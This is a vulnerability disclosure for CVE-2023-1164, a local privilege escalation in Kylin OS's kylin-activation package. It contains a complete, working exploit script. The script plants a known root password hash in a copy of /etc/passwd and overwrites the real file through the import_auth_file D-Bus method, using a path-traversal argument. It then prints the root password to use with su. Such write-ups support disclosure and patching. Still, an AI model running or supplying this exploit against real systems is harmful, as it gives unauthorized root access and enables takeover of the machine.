# Kylin OS kylin-activation privilege escalation vulnerability

Author: Set3r.Pan（8691003@qq.com）\
Unit: KylinSoft（https://www.kylinos.cn/）

### CVE ID
CVE-2023-1164
## Report
### Describe

The kylin-activation package is a component used by Kylin OS for authorization verification and activation. The software package does not strictly restrict the legality of the import file operation, so the directory where the system configuration file is located is imported into an illegal configuration file, resulting in the elevation of local privileges of ordinary users.


### Hazard level
High
### Affected version
- Desktop：kylin-activation < 1.3.11-23
- Server：kylin-activation < 1.30.10-5.p23
### POC&&EXP
ISO Download:\
https://distro-images.kylinos.cn:8802/web_pungi/download/share/HXDYtGjZm3daA4UvOTLkiPl1nB9ErM0c/

exploit.sh
```
echo "[*] Trying to overwrite passwd file ..."
cp /etc/passwd /tmp/passwd
sed -i 's/root:x:0:0:root/root:\$1\$nrDGqnHa\$EhGl0D2EBPmnQTC2hGvgl.:0:0:root/g' /tmp/passwd
dbus-send --system --dest=org.freedesktop.activation /org/freedesktop/activation org.freedesktop.activation.interface.import_auth_file string:../tmp/passwd
sleep 1
dbus-send --system --dest=org.freedesktop.activation /org/freedesktop/activation org.freedesktop.activation.interface.import_auth_file string:../tmp/passwd
sleep 1
echo '[*] Try login with root / 123qwe!@#QWE'
```
Run as a low-privileged user on the target OS:

<img width="515" alt="image" src="https://user-images.githubusercontent.com/35441986/223699923-d87d24fe-2cad-4999-983b-d3b76d70624e.png">

First, use the head -n 1 command to check the first line of /etc/passwd and find that it is normal：
```
root:x:0:0:root
```
Then, after running the exploit.sh script, recheck the content of the first line of /etc/passwd again, and found that it has been exploited successfully, and /etc/passwd has been replaced with the content controlled by the attacker. Then use the account password output by the script, use the su command, and find that the authority has been successfully raised to root authority.

### Vuln details
org.freedesktop.activation::import_auth_file receive files

<img width="700" alt="image" src="./imgs/CVE-2023-1164_1.png">

If the file exists, the service copies the file to /etc, causing arbitrary files to be written in the /etc directory

<img width="700" alt="image" src="./imgs/CVE-2023-1164_2.png">

